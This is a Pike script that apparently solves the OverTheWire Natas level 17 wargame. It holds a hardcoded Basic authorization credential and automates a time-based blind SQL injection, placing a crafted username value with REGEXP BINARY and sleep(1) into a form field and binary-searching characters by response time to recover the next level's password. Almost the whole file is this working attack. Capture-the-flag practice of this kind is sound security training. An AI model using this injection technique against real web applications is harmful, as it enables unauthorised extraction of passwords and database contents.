#!/usr/bin/pike

final constant url = "http://natas17.natas.labs.overthewire.org/index.php";
mapping headers = ([
    "Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==",
]);
final constant letters = "abcdefghijklmnopqrstuvwxyz";
final constant numbers = "1234567890";
string all_chars = upper_case(letters) + letters + numbers;

bool exists(mapping vars)
{
    System.Timer t = System.Timer();
    string raw = Protocols.HTTP.post_url_nice(url, vars, headers)[1];

    // Since the SQL query included sleep(1) on a match.
    if (t->get() > 1.0)
    {
        return true;
    }

    return false;
}

string find_letter(string haystack, string prefix)
{
    string q = sprintf("natas18\" AND password REGEXP BINARY \"^%s[%s]\" AND sleep(1) AND \"A\"=\"A",
                        prefix, haystack);
    mapping v = ([ "username": q ]);

    if (sizeof(haystack) == 1 && exists(v))
    {
        return haystack;
    }

    if (!exists(v))
    {
        return 0;
    }

    int m = sizeof(haystack) / 2;
    return find_letter(haystack[..m - 1], prefix) || find_letter(haystack[m..], prefix);
}

int main()
{
    // guesing 32, but really could be anything between 1-64.
    // If it is not 32 then you have to find the length in exactly
    // the same way we find the individual letters.
    int length = 32;
    string prefix = "";
    werror("Password length is: %d\n", length);
    werror("Brute forcing password: ");
    for (int i = 0; i < length; i++)
    {
        string l = find_letter(all_chars, prefix);
        prefix += l;
        werror("%s", l);
    }
    werror("\n");
    return 0;
}
